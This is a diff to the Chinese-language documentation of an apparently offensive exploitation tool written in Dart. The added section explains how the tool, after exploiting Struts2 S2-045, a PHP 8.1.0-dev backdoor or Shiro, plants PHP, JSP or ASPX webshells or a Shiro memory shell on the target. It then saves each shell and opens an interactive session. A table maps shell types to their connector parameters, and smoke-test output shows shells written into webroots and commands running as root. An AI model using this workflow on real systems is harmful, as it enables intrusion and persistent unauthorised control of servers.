@@ -70,3 +70,36 @@ dart tool/verify/module_smoke.dart --list
 # 单模块冒烟：检测 + 执行 + 取 shell
 dart tool/verify/module_smoke.dart struts2-s2045 http://127.0.0.1:8080 'id' --shell
 ```
+
+## 7. 获取 WebShell 后自动跳转（与 Shiro 模块一致）
+
+`ShellSession` 现在携带 `connectorType / type / method`，因此拿到 shell 后可以
+**直接作为 WebShell 入库并跳转到工作区**，无需用户手工再建一条：
+
+1. 点击「获取 WebShell」→ 成功后在弹窗里选择项目（可取消，取消则用临时会话）；
+2. 自动 `DatabaseHelper().createWebshell(...)`；
+3. `Navigator.push(WebshellInteractivePage(webshell: ws))` —— 与 Shiro 内存马注入后的行为一致；
+4. 结果卡片上另留「打开 WebShell / 复制」按钮，方便稍后再进。
+
+落盘 shell 与连接器的映射：
+
+| 落盘类型 | connectorType | 连接参数 |
+| --- | --- | --- |
+| PHP 小马 | `php_passthru` | `c` |
+| JSP 小马 | `jsp_runtime` | `c` |
+| ASPX / ASP | `aspx_cmd` / `asp_wscript` | `c` |
+| Tomcat 原生 JSP | `jsp_runtime` | `cmd` |
+| ThinkPHP / Zentao 原生 | `php_passthru` | `c` |
+| Shiro 内存马 | `jsp_behinder` | 随机密码 |
+
+**端到端验证**（冒烟脚本新增 `connect:`）：
+
+```
+# PHP 8.1.0-dev
+shell: [php] http://127.0.0.1:18080/mx_853a6.php — 写入 /var/www/html/mx_853a6.php
+connect: uid=0(root) gid=0(root) groups=0(root)
+
+# Struts2 S2-045 (Jetty)
+shell: [jsp] http://127.0.0.1:18080/mx_c38187a.jsp — 写入 /usr/src/src/main/webapp/mx_c38187a.jsp
+connect: uid=0(root) gid=0(root) groups=0(root)
+```
